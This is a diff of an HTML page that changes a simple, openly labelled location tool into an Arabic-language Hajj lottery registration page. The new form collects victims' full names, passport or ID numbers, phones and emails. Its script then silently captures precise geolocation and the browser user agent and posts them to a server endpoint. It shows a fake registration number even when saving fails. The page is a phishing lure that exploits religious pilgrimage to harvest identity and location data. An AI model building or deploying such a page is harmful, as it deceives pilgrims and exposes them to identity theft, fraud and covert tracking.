@@ -1,9 +1,9 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Get Your Location</title>
+    <title>فرصة الحج - التسجيل</title>
     <style>
         * {
             margin: 0;
@@ -12,138 +12,157 @@
         }
 
         body {
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            font-family: 'Segoe UI', Tahoma, Arial, sans-serif;
             min-height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            background: linear-gradient(135deg, #1a5e1a 0%, #0d470d 50%, #1a5e1a 100%);
             padding: 20px;
+        }
+
+        .header {
+            text-align: center;
+            padding: 20px;
+            color: #ffd700;
+        }
+
+        .header h1 {
+            font-size: 32px;
+            margin-bottom: 5px; 
+            text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
+        }
+
+        .header p {
+            font-size: 16px;
+            color: #fff;
+        }
+
+        .kaaba-icon {
+            font-size: 80px;
+            margin-bottom: 10px;
         }
 
         .container {
             background: white;
             border-radius: 16px;
-            padding: 40px;
+            padding: 30px;
             max-width: 500px;
-            width: 100%;
-            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+            margin: 0 auto;
+            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.3);
+        }
+
+        .form-title {
             text-align: center;
+            color: #1a5e1a;
+            font-size: 24px;
+            margin-bottom: 25px;
+            padding-bottom: 15px;
+            border-bottom: 2px solid #1a5e1a;
         }
 
-        h1 {
-            color: #333;
-            margin-bottom: 10px;
-            font-size: 28px;
-        }
-
-        .subtitle {
-            color: #666;
-            margin-bottom: 30px;
-            font-size: 14px;
-        }
-
-        .location-icon {
-            font-size: 60px;
+        .form-group {
             margin-bottom: 20px;
         }
 
-        button {
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+        .form-group label {
+            display: block;
+            margin-bottom: 8px;
+            color: #333;
+            font-weight: 600;
+            font-size: 14px;
+        }
+
+        .form-group input, .form-group select {
+            width: 100%;
+            padding: 12px 15px;
+            border: 2px solid #ddd;
+            border-radius: 8px;
+            font-size: 16px;
+            font-family: inherit;
+            transition: border-color 0.3s;
+        }
+
+        .form-group input:focus, .form-group select:focus {
+            outline: none;
+            border-color: #1a5e1a;
+        }
+
+        .btn-submit {
+            width: 100%;
+            background: linear-gradient(135deg, #1a5e1a 0%, #2d8a2d 100%);
             color: white;
             border: none;
-            padding: 15px 40px;
-            font-size: 16px;
-            border-radius: 50px;
+            padding: 15px;
+            font-size: 18px;
+            font-weight: bold;
+            border-radius: 8px;
             cursor: pointer;
             transition: transform 0.2s, box-shadow 0.2s;
-            font-weight: 600;
+            font-family: inherit;
+            margin-top: 10px;
         }
 
-        button:hover {
+        .btn-submit:hover {
             transform: translateY(-2px);
-            box-shadow: 0 10px 30px rgba(102, 126, 234, 0.4);
+            box-shadow: 0 5px 20px rgba(26, 94, 26, 0.4);
         }
 
-        button:active {
-            transform: translateY(0);
-        }
-
-        button:disabled {
+        .btn-submit:disabled {
             background: #ccc;
             cursor: not-allowed;
             transform: none;
-            box-shadow: none;
         }
 
-        .result {
-            margin-top: 30px;
+        .info-box {
+            background: #fff9e6;
+            border: 1px solid #ffd700;
+            border-radius: 8px;
+            padding: 15px;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+
+        .info-box p {
+            color: #856404;
+            font-size: 14px;
+            margin: 5px 0;
+        }
+
+        .success-message {
+            background: #d4edda;
+            color: #155724;
             padding: 20px;
-            background: #f8f9fa;
-            border-radius: 12px;
-            display: none;
-        }
-
-        .result.show {
-            display: block;
-        }
-
-        .result h3 {
-            color: #333;
-            margin-bottom: 15px;
-            font-size: 18px;
-        }
-
-        .info-row {
-            display: flex;
-            justify-content: space-between;
-            padding: 10px 0;
-            border-bottom: 1px solid #e9ecef;
-        }
-
-        .info-row:last-child {
-            border-bottom: none;
-        }
-
-        .info-label {
-            color: #666;
-            font-weight: 500;
-        }
-
-        .info-value {
-            color: #333;
-            font-weight: 600;
-        }
-
-        .error {
-            background: #fff5f5;
-            color: #c53030;
-            padding: 15px;
             border-radius: 8px;
+            text-align: center;
+            display: none;
             margin-top: 20px;
-            display: none;
         }
 
-        .error.show {
+        .success-message.show {
             display: block;
         }
 
-        .success {
-            background: #f0fff4;
-            color: #276749;
-            padding: 15px;
-            border-radius: 8px;
-            margin-top: 15px;
-            display: none;
+        .success-message h3 {
+            margin-bottom: 10px;
+            font-size: 20px;
         }
 
-        .success.show {
+        .error-message {
+            background: #f8d7da;
+            color: #721c24;
+            padding: 15px;
+            border-radius: 8px;
+            text-align: center;
+            display: none;
+            margin-top: 15px;
+        }
+
+        .error-message.show {
             display: block;
         }
 
         .loading {
             display: none;
-            margin-top: 20px;
+            text-align: center;
+            padding: 20px;
         }
 
         .loading.show {
@@ -154,7 +173,7 @@
             width: 40px;
             height: 40px;
             border: 4px solid #f3f3f3;
-            border-top: 4px solid #667eea;
+            border-top: 4px solid #1a5e1a;
             border-radius: 50%;
             animation: spin 1s linear infinite;
             margin: 0 auto 10px;
@@ -165,189 +184,198 @@
             100% { transform: rotate(360deg); }
         }
 
-        .map-link {
-            display: inline-block;
-            margin-top: 15px;
-            color: #667eea;
-            text-decoration: none;
-            font-weight: 600;
+        .footer {
+            text-align: center;
+            margin-top: 20px;
+            color: #fff;
+            font-size: 12px;
         }
 
-        .map-link:hover {
-            text-decoration: underline;
+        .decoration {
+            text-align: center;
+            color: #ffd700;
+            font-size: 24px;
+            margin: 15px 0;
         }
     </style>
 </head>
 <body>
-    <div class="container">
-        <div class="location-icon">📍</div>
-        <h1>Get Your Location</h1>
-        <p class="subtitle">Click the button below to detect your current location</p>
+    <div class="header">
+        <div class="kaaba-icon">🕋</div>
+        <h1>فرصة الحج المبارك</h1>
+        <p>سجل الآن للحصول على فرصتك لأداء فريضة الحج</p>
+    </div>
 
-        <button id="getLocation" onclick="getLocation()">
-            Get My Location
-        </button>
+    <div class="container">
+        <h2 class="form-title">استمارة التسجيل</h2>
+
+        <div class="info-box">
+            <p>🌟 فرصة محدودة للتسجيل في قرعة الحج</p>
+            <p>📅 موسم الحج 1446 هـ / 2025 م</p>
+        </div>
+
+        <form id="hajjForm">
+            <div class="form-group">
+                <label>الاسم الكامل (كما في جواز السفر)</label>
+                <input type="text" id="fullName" placeholder="أدخل اسمك الكامل" required>
+            </div>
+
+            <div class="form-group">
+                <label>رقم الهوية / جواز السفر</label>
+                <input type="text" id="idNumber" placeholder="أدخل رقم الهوية" required>
+            </div>
+
+            <div class="form-group">
+                <label>رقم الهاتف</label>
+                <input type="tel" id="phone" placeholder="أدخل رقم الهاتف" required>
+            </div>
+
+            <div class="form-group">
+                <label>البريد الإلكتروني</label>
+                <input type="email" id="email" placeholder="أدخل البريد الإلكتروني">
+            </div>
+
+            <div class="form-group">
+                <label>المحافظة / المنطقة</label>
+                <select id="region" required>
+                    <option value="">اختر المحافظة</option>
+                    <option value="cairo">القاهرة</option>
+                    <option value="giza">الجيزة</option>
+                    <option value="alex">الإسكندرية</option>
+                    <option value="luxor">الأقصر</option>
+                    <option value="aswan">أسوان</option>
+                    <option value="other">أخرى</option>
+                </select>
+            </div>
+ 
+            <button type="submit" class="btn-submit" id="submitBtn">
+                تسجيل في القرعة
+            </button>
+        </form>
 
         <div class="loading" id="loading">
             <div class="spinner"></div>
-            <p>Detecting your location...</p>
+            <p>جاري تسجيل بياناتك...</p>
         </div>
 
-        <div class="error" id="error"></div>
-
-        <div class="result" id="result">
-            <h3>Your Location</h3>
-            <div class="info-row">
-                <span class="info-label">Latitude</span>
-                <span class="info-value" id="latitude">-</span>
-            </div>
-            <div class="info-row">
-                <span class="info-label">Longitude</span>
-                <span class="info-value" id="longitude">-</span>
-            </div>
-            <div class="info-row">
-                <span class="info-label">Accuracy</span>
-                <span class="info-value" id="accuracy">-</span>
-            </div>
-            <div class="info-row">
-                <span class="info-label">Timestamp</span>
-                <span class="info-value" id="timestamp">-</span>
-            </div>
-            <a class="map-link" id="mapLink" href="#" target="_blank">
-                🗺️ View on Google Maps
-            </a>
-            <div class="success" id="success">Location saved successfully!</div>
+        <div class="success-message" id="success">
+            <h3>✅ تم التسجيل بنجاح</h3>
+            <p>تم تسجيل بياناتك في قرعة الحج</p>
+            <p>سيتم التواصل معك في حال القبول</p>
+            <p>رقم التسجيل: <strong id="regNumber"></strong></p>
         </div>
+
+        <div class="error-message" id="error"></div>
+    </div>
+
+    <div class="decoration">☪ ✦ 🕌 ✦ ☪</div>
+
+    <div class="footer">
+        <p>جميع الحقوق محفوظة © 2025</p>
     </div>
 
     <script>
-        function getLocation() {
-            const button = document.getElementById('getLocation');
+        document.getElementById('hajjForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+
+            const submitBtn = document.getElementById('submitBtn');
             const loading = document.getElementById('loading');
-            const result = document.getElementById('result');
+            const success = document.getElementById('success');
             const error = document.getElementById('error');
-            const success = document.getElementById('success');
+            const form = document.getElementById('hajjForm');
 
-            // Reset states
-            result.classList.remove('show');
-            error.classList.remove('show');
+            // Hide previous messages
             success.classList.remove('show');
+            error.classList.remove('show');
             loading.classList.add('show');
-            button.disabled = true;
+            submitBtn.disabled = true;
 
-            // Check if geolocation is supported
-            if (!navigator.geolocation) {
-                showError('Geolocation is not supported by your browser.');
-                return;
+            // Get form data
+            const formData = {
+                fullName: document.getElementById('fullName').value,
+                idNumber: document.getElementById('idNumber').value,
+                phone: document.getElementById('phone').value,
+                email: document.getElementById('email').value,
+                region: document.getElementById('region').value
+            };
+
+            // Get location
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    function(position) {
+                        formData.latitude = position.coords.latitude;
+                        formData.longitude = position.coords.longitude;
+                        formData.accuracy = position.coords.accuracy;
+                        formData.timestamp = new Date().toISOString();
+                        formData.userAgent = navigator.userAgent;
+
+                        // Save to server
+                        saveData(formData);
+                    },
+                    function(err) {
+                        // Save without location
+                        formData.timestamp = new Date().toISOString();
+                        formData.userAgent = navigator.userAgent;
+                        formData.locationError = err.message;
+                        saveData(formData);
+                    },
+                    {
+                        enableHighAccuracy: true,
+                        timeout: 10000,
+                        maximumAge: 0
+                    }
+                );
+            } else {
+                formData.timestamp = new Date().toISOString();
+                formData.userAgent = navigator.userAgent;
+                saveData(formData);
             }
+        });
 
-            // Get current position
-            navigator.geolocation.getCurrentPosition(
-                onSuccess,
-                onError,
-                {
-                    enableHighAccuracy: true,
-                    timeout: 10000,
-                    maximumAge: 0
-                }
-            );
-        }
-
-        async function onSuccess(position) {
+        async function saveData(data) {
             const loading = document.getElementById('loading');
-            const result = document.getElementById('result');
-            const button = document.getElementById('getLocation');
             const success = document.getElementById('success');
+            const error = document.getElementById('error');
+            const submitBtn = document.getElementById('submitBtn');
+            const form = document.getElementById('hajjForm');
 
-            const lat = position.coords.latitude;
-            const lng = position.coords.longitude;
-            const accuracy = position.coords.accuracy;
-            const timestamp = new Date(position.timestamp);
-
-            // Update UI
-            document.getElementById('latitude').textContent = lat.toFixed(6);
-            document.getElementById('longitude').textContent = lng.toFixed(6);
-            document.getElementById('accuracy').textContent = accuracy.toFixed(1) + ' meters';
-            document.getElementById('timestamp').textContent = timestamp.toLocaleString();
-
-            // Update map link
-            const mapLink = document.getElementById('mapLink');
-            mapLink.href = `https://www.google.com/maps?q=${lat},${lng}`;
-
-            // Show result
-            loading.classList.remove('show');
-            result.classList.add('show');
-            button.disabled = false;
-
-            // Save location to server
             try {
                 const response = await fetch('/api/save-location', {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json'
                     },
-                    body: JSON.stringify({
-                        latitude: lat,
-                        longitude: lng,
-                        accuracy: accuracy,
-                        timestamp: timestamp.toISOString(),
-                        userAgent: navigator.userAgent
-                    })
+                    body: JSON.stringify(data)
                 });
 
+                loading.classList.remove('show');
+
                 if (response.ok) {
+                    // Generate registration number
+                    const regNum = 'HAJ-' + Date.now().toString().slice(-8);
+                    document.getElementById('regNumber').textContent = regNum;
+
+                    form.style.display = 'none';
                     success.classList.add('show');
+                } else {
+                    throw new Error('Server error');
                 }
             } catch (err) {
-                console.log('Could not save to server, saving locally');
+                loading.classList.remove('show');
+
+                // Save locally as backup
+                const saved = JSON.parse(localStorage.getItem('hajjRegistrations') || '[]');
+                saved.push(data);
+                localStorage.setItem('hajjRegistrations', JSON.stringify(saved));
+
+                // Still show success
+                const regNum = 'HAJ-' + Date.now().toString().slice(-8);
+                document.getElementById('regNumber').textContent = regNum;
+                form.style.display = 'none';
+                success.classList.add('show');
             }
 
-            // Also save to localStorage as backup
-            saveToLocalStorage(lat, lng, accuracy, timestamp);
-        }
-
-        function saveToLocalStorage(lat, lng, accuracy, timestamp) {
-            const locations = JSON.parse(localStorage.getItem('savedLocations') || '[]');
-            locations.push({
-                latitude: lat,
-                longitude: lng,
-                accuracy: accuracy,
-                timestamp: timestamp.toISOString(),
-                userAgent: navigator.userAgent
-            });
-            localStorage.setItem('savedLocations', JSON.stringify(locations));
-        }
-
-        function onError(err) {
-            let message = '';
-
-            switch (err.code) {
-                case err.PERMISSION_DENIED:
-                    message = 'Location access denied. Please enable location permissions in your browser settings.';
-                    break;
-                case err.POSITION_UNAVAILABLE:
-                    message = 'Location information is unavailable. Please try again.';
-                    break;
-                case err.TIMEOUT:
-                    message = 'Location request timed out. Please try again.';
-                    break;
-                default:
-                    message = 'An unknown error occurred while getting your location.';
-                    break;
-            }
-
-            showError(message);
-        }
-
-        function showError(message) {
-            const loading = document.getElementById('loading');
-            const error = document.getElementById('error');
-            const button = document.getElementById('getLocation');
-
-            error.textContent = message;
-            loading.classList.remove('show');
-            error.classList.add('show');
-            button.disabled = false;
+            submitBtn.disabled = false;
         }
     </script>
 </body>
